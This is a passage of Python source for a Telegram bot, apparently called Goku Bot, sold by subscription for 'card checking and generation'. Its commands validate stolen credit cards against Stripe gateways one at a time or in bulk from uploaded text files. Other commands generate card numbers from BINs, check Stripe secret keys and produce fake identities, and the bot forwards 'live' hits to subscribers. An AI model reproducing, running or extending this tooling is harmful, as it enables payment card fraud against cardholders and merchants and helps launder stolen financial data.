<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐚𝐧𝐤: <code>{bank}</code>

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: <a href='https://t.me/+bkxW-_IANZQ3YjY1'>Goku </a>'''
                        live += 1
                        bot.reply_to(message, msg)
                        time.sleep(2)
                        bot.send_message(subscriber,msg)
                        time.sleep(2)
                    elif 'Card Not Activated' in last:
                        incorrect += 1
                    else:
                        dd += 1
                    time.sleep(1)
    except Exception as e:
        print(e)
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @GOKUOFFICIALREAL_BOT')
        time.sleep(2)

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
  with open("stop.stop", "w") as file:
    pass

@bot.message_handler(func=lambda message: message.text.startswith("/help") or message.text.startswith(".help"))
def help_command(message):
    user_id = str(message.from_user.id)
    is_admin = user_id in admin_ids
    if is_admin:
        help_text = """
<b>Admin & User Commands</b>
/register - 𝐑𝐞𝐠𝐢𝐬𝐭𝐞𝐫 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭.
/start - 𝐒𝐭𝐚𝐫𝐭 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐚𝐧𝐝 𝐜𝐡𝐞𝐜𝐤 subscription plan.
/chk cc|mm|yy|cvv - 𝐂𝐡𝐞𝐜𝐤 𝐚 𝐬𝐢𝐧𝐠𝐥𝐞 𝐜𝐚𝐫𝐝.
/redeem &lt;redeem_code&gt; - 𝐑𝐞𝐝𝐞𝐞𝐦 a subscription code.
/gate - 𝐂𝐡𝐚𝐧𝐠𝐞 𝐒𝐭𝐫𝐢𝐩𝐞 𝐆𝐚𝐭𝐞𝐰𝐚𝐲.
/help - 𝐒𝐡𝐨𝐰 𝐭𝐡𝐢𝐬 𝐡𝐞𝐥𝐩 𝐦𝐞𝐬𝐬𝐚𝐠𝐞.
/about - 𝐀𝐛𝐨𝐮𝐭 𝐭𝐡𝐞 𝐛𝐨𝐭.
/fake &lt;country_code&gt; - 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐟𝐚𝐤𝐞 𝐢𝐝𝐞𝐧𝐭𝐢𝐭𝐲 𝐝𝐞𝐭𝐚𝐢𝐥𝐬. Use /countrycode for codes.
/countrycode - 𝐋𝐢𝐬𝐭 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐜𝐨𝐮𝐧𝐭𝐫𝐲 𝐜𝐨𝐝𝐞𝐬 𝐟𝐨𝐫 /fake command.
/sk &lt;stripe_secret_key&gt; - 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐞 𝐚 𝐒𝐭𝐫𝐢𝐩𝐞 𝐒𝐞𝐜𝐫𝐞𝐭 𝐊𝐞𝐲.
/id - 𝐆𝐞𝐭 𝐘𝐨𝐮𝐫 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐃. 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐮𝐬𝐞𝐫 with /id to get 𝐭𝐡𝐞𝐢𝐫 𝐈𝐃.
/ping - 𝐂𝐡𝐞𝐜𝐤 𝐛𝐨𝐭 𝐥𝐚𝐭𝐞𝐧𝐜𝐲.
/gen bin|mm|yy|cvv amount - Generate CCs (Admin only)

𝐒𝐞𝐧𝐝 𝐚 𝐭𝐞𝐱𝐭 𝐟𝐢𝐥𝐞 - 𝐂𝐡𝐞𝐜𝐤 𝐦𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐜𝐚𝐫𝐝𝐬 𝐟𝐫𝐨𝐦 𝐚 𝐭𝐱𝐭 𝐟𝐢𝐥𝐞.

<b>Admin Commands (𝐎𝐧𝐥𝐲 𝐟𝐨𝐫 𝐀𝐝𝐦𝐢𝐧)</b>
/add &lt;user_id&gt; - 𝐀𝐝𝐝 a user to allowed list.
/delete &lt;user_id&gt; - 𝐑𝐞𝐦𝐨𝐯𝐞 a user from allowed list.
/code &lt;duration&gt; [number] - 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 redeem code(s) for a plan (e.g., /code 24hours 5, /code lifetime). Max 10 codes at once.
/broadcast &lt;message&gt; - Send a message to all bot users.
/stats - 𝐒𝐡𝐨𝐰 bot statistics.
/user_info &lt;user_id&gt; - 𝐆𝐞𝐭 info about a specific user.
/list_users - 𝐋𝐢𝐬𝐭 all allowed users.
/list_bot_users - 𝐋𝐢𝐬𝐭 all users who started the bot.
/reset_session - 𝐑𝐞𝐬𝐞𝐭 session file.
"""
    else:
        help_text = """
<b>User Commands</b>
/register - 𝐑𝐞𝐠𝐢𝐬𝐭𝐞𝐫 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭.
/start - 𝐒𝐭𝐚𝐫𝐭 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐚𝐧𝐝 𝐜𝐡𝐞𝐜𝐤 subscription plan.
/chk cc|mm|yy|cvv - 𝐂𝐡𝐞𝐜𝐤 𝐚 𝐬𝐢𝐧𝐠𝐥𝐞 𝐜𝐚𝐫𝐝.
/redeem &lt;redeem_code&gt; - 𝐑𝐞𝐝𝐞𝐞𝐦 a subscription code.
/gate - 𝐂𝐡𝐚𝐧𝐠𝐞 𝐒𝐭𝐫𝐢𝐩𝐞 𝐆𝐚𝐭𝐞𝐰𝐚𝐲.
/help - 𝐒𝐡𝐨𝐰 𝐭𝐡𝐢𝐬 𝐡𝐞𝐥𝐩 𝐦𝐞𝐬𝐬𝐚𝐠𝐞.
/about - 𝐀𝐛𝐨𝐮𝐭 𝐭𝐡𝐞 𝐛𝐨𝐭.
/fake &lt;country_code&gt; - 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐟𝐚𝐤𝐞 𝐢𝐝𝐞𝐧𝐭𝐢𝐭𝐲 𝐝𝐞𝐭𝐚𝐢𝐥𝐬. Use /countrycode for codes.
/countrycode - 𝐋𝐢𝐬𝐭 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐜𝐨𝐮𝐧𝐭𝐫𝐲 𝐜𝐨𝐝𝐞𝐬 𝐟𝐨𝐫 /fake command.
/sk &lt;stripe_secret_key&gt; - 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐞 𝐚 𝐒𝐭𝐫𝐢𝐩𝐞 𝐒𝐞𝐜𝐫𝐞𝐭 𝐊𝐞𝐲.
/id - 𝐆𝐞𝐭 𝐘𝐨𝐮𝐫 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐃. 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐮𝐬𝐞𝐫 with /id to get 𝐭𝐡𝐞𝐢𝐫 𝐈𝐃.
/ping - 𝐂𝐡𝐞𝐜𝐤 𝐛𝐨𝐭 𝐥𝐚𝐭𝐞𝐧𝐜𝐲.

𝐒𝐞𝐧𝐝 𝐚 𝐭𝐞𝐱𝐭 𝐟𝐢𝐥𝐞 - 𝐂𝐡𝐞𝐜𝐤 𝐦𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐜𝐚𝐫𝐝𝐬 𝐟𝐫𝐨𝐦 𝐚 𝐭𝐱𝐭 𝐟𝐢𝐥𝐞.
"""
    bot.reply_to(message, help_text, parse_mode="HTML")
    time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/about") or message.text.startswith(".about"))
def about_command(message):
    about_text = """
<b>🤖 About Goku Bot 🤖</b>

This bot is designed for card checking and generation.

<b>👨‍💻 Developer:</b> @GOKUOFFICIALREAL_BOT

<b>📢 Channel:</b> @GOKUOFFICIALREAL_BOT

For support or inquiries, please contact the developer.
"""
    bot.reply_to(message, about_text, parse_mode="HTML")
    time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/stats") or message.text.startswith(".stats"))
def stats_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_ids:
        bot.send_message(message.chat.id, "You do not have permission to use this command.🚫")
        time.sleep(0.1)
    allowed_user_count = len(load_allowed_users())
    redeem_codes_count = len(load_redeem_codes())
    active_subscriptions = 0
    user_plans = load_user_plans()
    for plan in user_plans.values():
        if is_user_subscribed_static(plan):
            active_subscriptions += 1
    bot_users_count = len(load_bot_users())
    stats_text = f"""
<b>📊 Bot Statistics 📊</b>

<b>✅ Allowed Users:</b> {allowed_user_count}
<b>🎁 Redeem Codes Available:</b> {redeem_codes_count}
<b>⭐ Active Subscriptions:</b> {active_subscriptions}
<b>👥 Total Bot Users:</b> {bot_users_count}
"""
    bot.reply_to(message, stats_text, parse_mode="HTML")
    time.sleep(0.1)

def is_user_subscribed_static(user_plan):
    if not user_plan:
        return False
    expiry_time_str = user_plan.get("expiry_time")
    if user_plan["plan_type"] == "lifetime":
        return False
    if not expiry_time_str:
        return True
    expiry_time = datetime.fromtimestamp(float(expiry_time_str))
    return datetime.now() <= expiry_time

@bot.message_handler(func=lambda message: message.text.startswith("/user_info") or message.text.startswith(".user_info"))
def user_info_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_ids:
        bot.send_message(message.chat.id, "You do not have permission to use this command.🚫")
        time.sleep(0.1)
    try:
        target_user_id = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "Please provide a user ID to get info. Example: /user_info 123456789")
        time.sleep(0.1)
    user_plan = get_user_plan(target_user_id)
    user_allowed = str(target_user_id) in load_allowed_users()
    plan_type = "No Plan"
    expiry_message = "N/A"
    if user_plan:
        plan_type = user_plan['plan_type'].upper()
        expiry_time_str = user_plan.get('expiry_time')
        if plan_type.lower() == "lifetime":
            expiry_message = "Lifetime"
        elif expiry_time_str:
            expiry_message = f"Expires: {datetime.fromtimestamp(float(expiry_time_str)).strftime('%Y-%m-%d %H:%M:%S')}"
        else:
            expiry_message = "No Expiry Date"
    user_info_text = f"""
<b>👤 User Info for User ID: <code>{target_user_id}</code> 👤</b>

<b>⭐ Plan Type:</b> <code>{plan_type}</code>
<b>⏳ Plan Expiry:</b> <code>{expiry_message}</code>
<b>✅ Allowed User:</b> <code>{user_allowed}</code>
"""
    bot.reply_to(message, user_info_text, parse_mode="HTML")
    time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/list_users") or message.text.startswith(".list_users"))
def list_users_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_ids:
        bot.send_message(message.chat.id, "You do not have permission to use this command.🚫")
        time.sleep(0.1)
    users = load_allowed_users()
    non_admin_users = [user for user in users if user not in admin_ids]
    if not non_admin_users:
        bot.reply_to(message, "No users are currently in the allowed users list (excluding admins).")
        time.sleep(0.1)
    users_list_text = "<b>✅ Allowed Users (Non-Admin) ✅</b>\n\n"
    for user in non_admin_users:
        user_plan = get_user_plan(user)
        plan_type = "No Plan"
        if user_plan:
            plan_type = user_plan['plan_type'].upper()
        users_list_text += f"- <code>{user}</code> - Plan: <code>{plan_type}</code>\n"
    bot.reply_to(message, users_list_text, parse_mode="HTML")
    time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/list_bot_users") or message.text.startswith(".list_bot_users"))
def list_bot_users_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_ids:
        bot.send_message(message.chat.id, "You do not have permission to use this command.🚫")
        time.sleep(0.1)
    bot_user_ids = load_bot_users()
    if not bot_user_ids:
        bot.reply_to(message, "No users have started the bot yet.")
        time.sleep(0.1)
    users_list_text = "<b>👥 All Bot Users 👥</b>\n\n"
    for user_id in bot_user_ids:
        users_list_text += f"- <code>{user_id}</code>\n"
    bot.reply_to(message, users_list_text, parse_mode="HTML")
    time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/reset_session") or message.text.startswith(".reset_session"))
def reset_session_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_ids:
        bot.send_message(message.chat.id, "You do not have permission to use this command.🚫")
        time.sleep(0.1)
    if os.path.exists(SESSION_FILE):
        os.remove(SESSION_FILE)
        bot.reply_to(message, "Session file has been reset successfully.✅ New session will be created on next check.")
        time.sleep(0.1)
    else:
        bot.reply_to(message, "Session file does not exist.")
        time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/broadcast") or message.text.startswith(".broadcast"))
def broadcast_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_ids:
        bot.send_message(message.chat.id, "You do not have permission to use this command.🚫")
        time.sleep(0.1)
    try:
        broadcast_message = message.text.split(maxsplit=1)[1]
    except IndexError:
        bot.reply_to(message, "Please provide a message to broadcast. Example: /broadcast Hello everyone!")
        time.sleep(0.1)
    bot_user_ids = load_bot_users()
    broadcast_count = 0
    error_count = 0
    for user_to_broadcast in bot_user_ids:
        try:
            bot.send_message(user_to_broadcast, f"<b>📢 Broadcast Message from Admin 📢</b>\n\n{broadcast_message}", parse_mode="HTML")
            broadcast_count += 1
            time.sleep(0.1)
        except Exception as e:
            print(f"Could not broadcast to user {user_to_broadcast}: {e}")
            error_count += 1
    bot.reply_to(message, f"Broadcast message sent to {broadcast_count} users. Errors to {error_count} users.")
    time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/gate") or message.text.startswith(".gate"))
def gate_command(message):
    user_id = str(message.from_user.id)
    markup = types.InlineKeyboardMarkup(row_width=3)
    btn_auth = types.InlineKeyboardButton("Auth", callback_data='gate_auth')
    btn_2_dollar = types.InlineKeyboardButton("2$", callback_data='gate_2$')
    btn_4_dollar = types.InlineKeyboardButton("4$", callback_data='gate_4$')
    markup.add(btn_auth, btn_2_dollar, btn_4_dollar)
    bot.reply_to(message, "Choose your Stripe Gateway:", reply_markup=markup)
    time.sleep(0.1)

@bot.callback_query_handler(func=lambda call: call.data.startswith('gate_'))
def gate_callback(call):
    user_id = str(call.from_user.id)
    gate_type = call.data.split('_')[1]
    if set_user_gate(user_id, gate_type):
        bot.answer_callback_query(call.id, "Gate successfully changed!", show_alert=True)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"Gateway set to {gate_type.upper()} ✅")
        time.sleep(0.1)
    else:
        bot.answer_callback_query(call.id, "Invalid gateway selected.", show_alert=True)
        time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/fake") or message.text.startswith(".fake"))
def fake_command(message):
    user_id = str(message.from_user.id)
    allowed_users = load_allowed_users()
    if str(user_id) not in allowed_users:
        bot.send_message(message.chat.id, "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        return
    if not is_user_subscribed(user_id) and str(user_id) not in admin_ids:
        bot.send_message(message.chat.id, "🚫 Your subscription has expired or you don't have an active plan. Use /redeem to activate a plan.")
        return
    send_fake_details_gen(message, bot)

@bot.message_handler(func=lambda message: message.text.startswith("/countrycode") or message.text.startswith(".countrycode"))
def countrycode_command(message):
    user_id = str(message.from_user.id)
    allowed_users = load_allowed_users()
    if str(user_id) not in allowed_users:
        bot.send_message(message.chat.id, "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        return
    if not is_user_subscribed(user_id) and str(user_id) not in admin_ids:
        bot.send_message(message.chat.id, "🚫 Your subscription has expired or you don't have an active plan. Use /redeem to activate a plan.")
        return
    send_country_codes_list(message, bot)

@bot.message_handler(func=lambda message: message.text.startswith("/sk") or message.text.startswith(".sk"))
def sk_command(message):
    user_id = str(message.from_user.id)
    allowed_users = load_allowed_users()
    if str(user_id) not in allowed_users:
        bot.send_message(message.chat.id, "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        return
    if not is_user_subscribed(user_id) and str(user_id) not in admin_ids:
        bot.send_message(message.chat.id, "🚫 Your subscription has expired or you don't have an active plan. Use /redeem to activate a plan.")
        return
    try:
        stripe_key = message.text.split()[1]
        result_message = sk_check(stripe_key)
        bot.reply_to(message, result_message, parse_mode="HTML")
    except IndexError:
        bot.reply_to(message, "Please provide a Stripe Secret Key. Example: /sk sk_live_...")

@bot.message_handler(func=lambda message: message.text.startswith("/id") or message.text.startswith(".id"))
def id_command(message):
    user_id = str(message.from_user.id)
    allowed_users = load_allowed_users()
    if str(user_id) not in allowed_users:
        bot.send_message(message.chat.id, "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        return
    if not is_user_subscribed(user_id) and str(user_id) not in admin_ids:
        bot.send_message(message.chat.id, "🚫 Your subscription has expired or you don't have an active plan. Use /redeem to activate a plan.")
        return
    if message.reply_to_message:
        get_user_telegram_info(bot, message.reply_to_message)
    else:
        get_user_telegram_info(bot, message)

@bot.message_handler(func=lambda message: message.text.startswith("/ping") or message.text.startswith(".ping"))
def ping_command(message):
    start_time = time.time()
    pong = bot.reply_to(message, "<code>Pinging...</code>", parse_mode="HTML")
    end_time = time.time()
    latency_ms = int(round((end_time - start_time) * 1000))
    bot.edit_message_text(f"<code>Pong!</code> 🏓\n<b>Latency:</b> <code>{latency_ms}ms</code>", message.chat.id, pong.message_id, parse_mode="HTML")


command_handlers = [
    ("add", add_user), ("delete", delete_user), ("code", generate_code),
    ("redeem", redeem_code), ("gen", gen_command_handler),
    ("credits", credits_command_removed), ("chk", check_single_card_command),
    ("check", check_single_card_command), ("bin", check_single_card_command),
    ("戮", check_single_card_command), ("validate", check_single_card_command),
    ("验卡", check_single_card_command), ("cc", check_single_card_command),
    ("card", check_single_card_command), ("info", check_single_card_command),
    ("栓卡", check_single_card_command), ("查询", check_single_card_command),
    ("help", help_command), ("about", about_command), ("stats", stats_command),
    ("user_info", user_info_command), ("list_users", list_users_command),
    ("list_bot_users", list_bot_users_command), ("reset_session", reset_session_command),
    ("broadcast", broadcast_command), ("gate", gate_command), ("fake", fake_command),
    ("countrycode", countrycode_command), ("sk", sk_command), ("id", id_command),
    ("ping", ping_command)
]

for command, handler in command_handlers:
    @bot.message_handler(func=lambda message: message.text.startswith(f"/{command}") or message.text.startswith(f".{command}"))
    def wrapped_handler(message):
        user_id = str(message.from_user.id)
        if not is_user_registered(user_id) and user_id not in admin_ids:
            bot.send_message(message.chat.id, "🚫 You need to register first to use the bot. Use /register to get started.")
            return
        handler(message)

@bot.message_handler(func=lambda message: message.content_type == 'document')
def document_handler(message):
    user_id = str(message.from_user.id)
    if not is_user_registered(user_id) and user_id not in admin_ids:
        bot.send_message(message.chat.id, "🚫 You need to register first to use the bot. Use /register to get started.")
        return
    main(message)


logop = f'''━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━bot by @GOKUOFFICIALREAL_BOT started sucessfully ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'''
print(logop)
bot.polling()
